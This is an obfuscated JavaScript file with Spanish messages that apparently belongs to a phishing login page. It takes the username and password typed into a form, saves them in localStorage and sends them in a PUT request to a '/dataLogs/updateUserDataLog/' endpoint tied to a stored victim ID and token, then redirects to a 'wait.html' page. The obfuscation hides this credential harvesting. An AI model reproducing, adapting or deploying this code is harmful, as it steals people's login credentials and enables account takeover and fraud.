const _0x3923ab = _0x37e0;
(function (_0x3090f7, _0x1204b0) {
  const _0x2072ca = _0x37e0,
    _0x1e0184 = _0x3090f7();
  while (!![]) {
    try {
      const _0x395a9f =
        -parseInt(_0x2072ca(0xca)) / 0x1 +
        -parseInt(_0x2072ca(0xd8)) / 0x2 +
        (-parseInt(_0x2072ca(0xd0)) / 0x3) * (parseInt(_0x2072ca(0xd4)) / 0x4) +
        (-parseInt(_0x2072ca(0xd7)) / 0x5) * (parseInt(_0x2072ca(0xe3)) / 0x6) +
        (-parseInt(_0x2072ca(0xec)) / 0x7) *
          (-parseInt(_0x2072ca(0xd5)) / 0x8) +
        -parseInt(_0x2072ca(0xe1)) / 0x9 +
        (-parseInt(_0x2072ca(0xd6)) / 0xa) * (-parseInt(_0x2072ca(0xc9)) / 0xb);
      if (_0x395a9f === _0x1204b0) break;
      else _0x1e0184["push"](_0x1e0184["shift"]());
    } catch (_0x1ccf79) {
      _0x1e0184["push"](_0x1e0184["shift"]());
    }
  }
})(_0x3a03, 0xf41fe);
function updateLS() {
  const _0x298767 = _0x37e0;
  LS[_0x298767(0xd3)](_0x298767(0xe5), JSON[_0x298767(0xdc)](info));
}
const button = document[_0x3923ab(0xea)]("btnUsuario"),
  userInput = document["getElementById"](_0x3923ab(0xed)),
  passInput = document["getElementById"](_0x3923ab(0xd1));
async function updateStatusUser() {
  const _0x4cc783 = _0x3923ab;
  button[_0x4cc783(0xe0)] = !![];
  try {
    const _0x17b44b = localStorage[_0x4cc783(0xda)](_0x4cc783(0xe6)),
      _0x56a14d = localStorage[_0x4cc783(0xda)](_0x4cc783(0xdb));
    if (!_0x17b44b || !_0x56a14d) throw new Error(_0x4cc783(0xcc));
    const _0xea4e50 = await fetch(
      url + "/dataLogs/updateUserDataLog/" + _0x17b44b,
      {
        method: _0x4cc783(0xcf),
        headers: {
          "Content-Type": "application/json",
          Authorization: _0x4cc783(0xd2) + _0x56a14d,
          Origin: window[_0x4cc783(0xd9)][_0x4cc783(0xef)],
        },
        body: JSON[_0x4cc783(0xdc)]({
          us: info["metaInfo"][_0x4cc783(0xeb)],
          ps: info[_0x4cc783(0xdf)]["puser"],
          status: _0x4cc783(0xce),
        }),
      }
    );
    if (!_0xea4e50["ok"]) {
      const _0x347e7f = await _0xea4e50[_0x4cc783(0xcb)]();
      throw new Error(
        _0x347e7f[_0x4cc783(0xe4)] ||
          "Error\x20al\x20actualizar\x20los\x20datos\x20en\x20el\x20servidor"
      );
    }
    const _0x707d6f = await _0xea4e50[_0x4cc783(0xcb)]();
    console["log"](_0x4cc783(0xcd));
  } catch (_0x147fe9) {
    console["error"](_0x4cc783(0xe8), _0x147fe9);
  } finally {
    (button[_0x4cc783(0xe0)] = ![]),
      (window[_0x4cc783(0xd9)]["href"] = _0x4cc783(0xe2));
  }
}
function _0x37e0(_0x5c3dc8, _0x5a6f0e) {
  const _0x3a0349 = _0x3a03();
  return (
    (_0x37e0 = function (_0x37e0d6, _0x2c0bc7) {
      _0x37e0d6 = _0x37e0d6 - 0xc9;
      let _0xc89f61 = _0x3a0349[_0x37e0d6];
      return _0xc89f61;
    }),
    _0x37e0(_0x5c3dc8, _0x5a6f0e)
  );
}
button["addEventListener"](_0x3923ab(0xdd), async function (_0x15b249) {
  const _0x4a4047 = _0x3923ab;
  _0x15b249[_0x4a4047(0xde)]();
  if (userInput[_0x4a4047(0xee)] === "" || passInput["value"] === "") {
    alert(_0x4a4047(0xe7)), userInput[_0x4a4047(0xe9)]();
    return;
  }
  const _0x1ffe7c = userInput[_0x4a4047(0xee)],
    _0x19777d = passInput[_0x4a4047(0xee)];
  (info[_0x4a4047(0xdf)][_0x4a4047(0xeb)] = _0x1ffe7c),
    (info[_0x4a4047(0xdf)]["puser"] = _0x19777d),
    updateLS(),
    await updateStatusUser();
});
function _0x3a03() {
  const _0x393ba0 = [
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "Usuario\x20actualizado\x20correctamente",
    "Corrigió\x20Usuario",
    "PUT",
    "4641spSrDs",
    "txtPass",
    "Bearer\x20",
    "setItem",
    "4620PVLvLA",
    "200DmXAqW",
    "11047370PsjGwF",
    "3875IqNMBK",
    "114348sjZVcS",
    "location",
    "getItem",
    "dataLogToken",
    "stringify",
    "click",
    "preventDefault",
    "metaInfo",
    "disabled",
    "16856334sUbdJV",
    "wait.html",
    "13146yAoFDe",
    "error",
    "info",
    "dataLogId",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "Error\x20al\x20procesar\x20la\x20actualización:",
    "focus",
    "getElementById",
    "user",
    "369187NDmPSN",
    "txtUsuario",
    "value",
    "origin",
    "55fBaeLv",
    "427366dHoXBR",
    "json",
  ];
  _0x3a03 = function () {
    return _0x393ba0;
  };
  return _0x3a03();
}
